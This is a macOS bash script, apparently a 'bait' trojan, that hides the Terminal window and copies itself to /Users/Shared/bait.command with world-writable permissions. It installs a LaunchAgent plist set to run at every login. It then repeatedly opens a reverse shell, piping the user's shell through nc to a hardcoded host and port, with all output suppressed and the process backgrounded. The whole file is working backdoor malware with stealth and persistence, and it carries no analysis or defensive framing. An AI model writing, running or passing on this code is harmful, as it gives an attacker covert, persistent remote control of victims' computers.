#!/bin/bash
osascript -e "tell application \"Finder\" to activate";
osascript -e "tell application \"Terminal\" to set visible of window 1 to false";

sh -c '
#killall Terminal;

python3 -c "
HOST,PORT=\"10.1.36.43\",\"9742\"
from subprocess import run, Popen, PIPE
from time import sleep
import os
script_path = os.path.abspath(\"$1\")
shared_path = os.path.abspath(\"$HOME/../Shared\")
la_path = \"$HOME/Library/LaunchAgents\"

plist_data = \"\"\"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n\t<key>Label</key>\n\t<string>bait</string>\n\t<key>ProgramArguments</key>\n\t<array>\n\t\t<string>/Users/Shared/bait.command</string>\n\t</array>\n\t<key>StandardOutPath</key>\n\t<string>/Users/Shared/llogs.log</string>\n\t<key>StandardErrorPath</key>\n\t<string>/Users/Shared/llogs.log</string>\n\t<key>RunAtLoad</key>\n\t<true/>\n</dict>\n</plist>\"\"\"

with open(script_path,\"r\") as e:
    filedata = e.readlines()
    filedata[15] = f\"script_path=\\\\\\\"{script_path}\\\\\\\"\\n\"
    filedata[16] = f\"shared_path=\\\\\\\"{shared_path}\\\\\\\"\\n\"
    filedata[17] = f\"la_path=\\\\\\\"{la_path}\\\\\\\"\\n\"
    with open(shared_path+\"/bait.command\",\"w\") as b:
        b.writelines(filedata)
Popen([\"chmod\",\"777\",\"/Users/Shared/bait.command\"])

if not \"bait.plist\" in os.listdir(la_path):
    with open(os.path.expanduser(f\"~/Library/LaunchAgents/bait.plist\"),\"w\") as e:
        e.write(plist_data)


       
# Payload here
for _ in range(5):
    try:
        nc_process = Popen([\"nc\", HOST, str(PORT)], stdin=PIPE, stdout=PIPE, text=True)
        sh_process = Popen([\"$SHELL\"], stdin=nc_process.stdout, stdout=nc_process.stdin, stderr=nc_process.stdin, text=True)
        nc_process.wait()
        sh_process.kill()
        sleep(5)
    except:
        pass;
" >> /dev/null 2>&1' _ "$FILE_NAME" >> /dev/null 2>&1 &